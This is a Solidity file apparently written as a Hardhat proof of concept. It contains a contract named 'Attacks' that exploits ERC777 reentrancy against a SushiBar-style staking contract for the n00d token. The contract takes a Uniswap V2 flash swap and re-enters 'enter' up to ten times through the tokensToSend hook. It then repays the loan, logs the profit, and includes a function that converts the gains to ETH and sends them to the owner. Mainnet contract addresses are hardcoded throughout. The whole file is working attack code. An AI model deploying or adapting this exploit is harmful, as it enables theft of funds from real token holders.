pragma solidity ^0.6.12;
import "hardhat/console.sol";

interface IERC1820Registry {
    event InterfaceImplementerSet(
        address indexed account,
        bytes32 indexed interfaceHash,
        address indexed implementer
    );

    event ManagerChanged(address indexed account, address indexed newManager);

    /**
     * @dev Sets `newManager` as the manager for `account`. A manager of an
     * account is able to set interface implementers for it.
     *
     * By default, each account is its own manager. Passing a value of `0x0` in
     * `newManager` will reset the manager to this initial state.
     *
     * Emits a {ManagerChanged} event.
     *
     * Requirements:
     *
     * - the caller must be the current manager for `account`.
     */
    function setManager(address account, address newManager) external;

    /**
     * @dev Returns the manager for `account`.
     *
     * See {setManager}.
     */
    function getManager(address account) external view returns (address);

    /**
     * @dev Sets the `implementer` contract as ``account``'s implementer for
     * `interfaceHash`.
     *
     * `account` being the zero address is an alias for the caller's address.
     * The zero address can also be used in `implementer` to remove an old one.
     *
     * See {interfaceHash} to learn how these are created.
     *
     * Emits an {InterfaceImplementerSet} event.
     *
     * Requirements:
     *
     * - the caller must be the current manager for `account`.
     * - `interfaceHash` must not be an {IERC165} interface id (i.e. it must not
     * end in 28 zeroes).
     * - `implementer` must implement {IERC1820Implementer} and return true when
     * queried for support, unless `implementer` is the caller. See
     * {IERC1820Implementer-canImplementInterfaceForAddress}.
     */
    function setInterfaceImplementer(
        address account,
        bytes32 _interfaceHash,
        address implementer
    ) external;

    /**
     * @dev Returns the implementer of `interfaceHash` for `account`. If no such
     * implementer is registered, returns the zero address.
     *
     * If `interfaceHash` is an {IERC165} interface id (i.e. it ends with 28
     * zeroes), `account` will be queried for support of it.
     *
     * `account` being the zero address is an alias for the caller's address.
     */
    function getInterfaceImplementer(address account, bytes32 _interfaceHash)
        external
        view
        returns (address);

    /**
     * @dev Returns the interface hash for an `interfaceName`, as defined in the
     * corresponding
     * https://eips.ethereum.org/EIPS/eip-1820#interface-name[section of the EIP].
     */
    function interfaceHash(string calldata interfaceName)
        external
        pure
        returns (bytes32);

    /**
     * @notice Updates the cache with whether the contract implements an ERC165 interface or not.
     * @param account Address of the contract for which to update the cache.
     * @param interfaceId ERC165 interface for which to update the cache.
     */
    function updateERC165Cache(address account, bytes4 interfaceId) external;

    /**
     * @notice Checks whether a contract implements an ERC165 interface or not.
     * If the result is not cached a direct lookup on the contract address is performed.
     * If the result is not cached or the cached value is out-of-date, the cache MUST be updated manually by calling
     * {updateERC165Cache} with the contract address.
     * @param account Address of the contract to check.
     * @param interfaceId ERC165 interface to check.
     * @return True if `account` implements `interfaceId`, false otherwise.
     */
    function implementsERC165Interface(address account, bytes4 interfaceId)
        external
        view
        returns (bool);

    /**
     * @notice Checks whether a contract implements an ERC165 interface or not without using nor updating the cache.
     * @param account Address of the contract to check.
     * @param interfaceId ERC165 interface to check.
     * @return True if `account` implements `interfaceId`, false otherwise.
     */
    function implementsERC165InterfaceNoCache(
        address account,
        bytes4 interfaceId
    ) external view returns (bool);
}

interface IERC777 {
    /**
     * @dev Returns the amount of tokens owned by an account (`owner`).
     */
    function balanceOf(address owner) external view returns (uint256);

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Note that accounts cannot have allowance issued by their operators.
     */
    function approve(address spender, uint256 value) external returns (bool);

    function enter(uint256 _amount) external;

    // Leave the bar. Claim back your SUSHIs.
    function leave(uint256 _share) external;

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender)
        external
        view
        returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, "sub-underflow");
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Undivision by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IERC777Sender {
    /**
     * @dev Called by an {IERC777} token contract whenever a registered holder's
     * (`from`) tokens are about to be moved or destroyed. The type of operation
     * is conveyed by `to` being the zero address or not.
     *
     * This call occurs _before_ the token contract's state is updated, so
     * {IERC777-balanceOf}, etc., can be used to query the pre-operation state.
     *
     * This function may revert to prevent the operation from being executed.
     */
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;

    function approve(address guy, uint256 wad) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);
}

contract Attacks is IERC777Sender, IUniswapV2Callee {
    using SafeMath for uint256;
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH =
        keccak256("ERC777TokensSender");

    IERC1820Registry internal constant _ERC1820_REGISTRY =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    uint256 attackindex = 0;

    address sushiBar = address(0x3C4f8a74B54175E372fc784A83C5b2D6Bcd12EE2);

    address n00d = address(0x5006192340D83bFa47ee2F28Edd0fd16a56d5b5e);

    address pair = address(0xC9C49952fAC2c5D48D21e662b0472d34Ec35E526);

    address owner;

    bool isZero;

    constructor() public {
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            _TOKENS_SENDER_INTERFACE_HASH,
            address(this)
        );
        owner = msg.sender;
    }

    function attacks() external {
        isZero = (IUniswapV2Pair(pair).token0() == n00d);
        if (isZero) {
            IUniswapV2Pair(pair).swap(
                IERC777(n00d).balanceOf(pair).div(20),
                0,
                address(this),
                "0xcallflash"
            );
        } else {
            IUniswapV2Pair(pair).swap(
                0,
                IERC777(n00d).balanceOf(pair).div(20),
                address(this),
                "0xcallflash"
            );
        }
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        uint256 baseAmount = isZero ? amount0 : amount1;
        IERC777(n00d).approve(sushiBar, type(uint256).max);
        uint256 n00dbalance = IERC777(n00d).balanceOf(address(this));
        console.log("n00d '%s' baseAmount", n00dbalance, baseAmount.sub(1));
        IERC777(sushiBar).enter(baseAmount.div(10));
        IERC777(sushiBar).leave(IERC777(sushiBar).balanceOf(address(this)));
        uint256 repayment = baseAmount.add(baseAmount.mul(3).div(1000)).add(
            1000000 ether
        );
        console.log("repayment '%s'", repayment);
        IERC777(n00d).transfer(msg.sender, repayment);
        uint256 porfit = IERC777(n00d).balanceOf(address(this));
        console.log("porfit '%s'", porfit);
        // swapInETH();
    }

    receive() external payable {}

    function swapInETH() external {
        uint256 porfit = IERC777(n00d).balanceOf(address(this));
        (uint256 reserveIn, uint256 reserveOut, ) = IUniswapV2Pair(
            address(0xC9C49952fAC2c5D48D21e662b0472d34Ec35E526)
        ).getReserves();
        uint256 amountOut = getAmountOut(porfit, reserveIn, reserveOut);
        IERC777(n00d).transfer(
            address(0xC9C49952fAC2c5D48D21e662b0472d34Ec35E526),
            porfit
        );
        IUniswapV2Pair(address(0xC9C49952fAC2c5D48D21e662b0472d34Ec35E526))
            .swap(0, amountOut, address(this), "");
        IWETH(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).withdraw(
            amountOut
        );
        console.log(" owner", owner.balance);
        payable(owner).transfer(amountOut);
        console.log(" 换出eth '%s'  porfit '%s' ", amountOut, porfit);
        console.log(" owner", owner.balance);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) public override {
        console.log("tokensToSend:operator '%s' from '%s'", operator, from);
        console.log("tokensToSend:to '%s' amount '%s'", to, amount);
        attackindex++;
        uint256 n00dbalance = IERC777(n00d).balanceOf(address(this));
        console.log("重入次数 '%s' +balance : '%s'", attackindex, n00dbalance);
        if (attackindex < 10) {
            IERC777(sushiBar).enter(amount);
        }
    }

    // copy from UniswapV2Library
    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniswapV2Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 numerator = reserveIn.mul(amountOut).mul(1000);
        uint256 denominator = reserveOut.sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }

    // copy from UniswapV2Library
    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniswapV2Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 amountInWithFee = amountIn.mul(997);
        uint256 numerator = amountInWithFee.mul(reserveOut);
        uint256 denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }
}
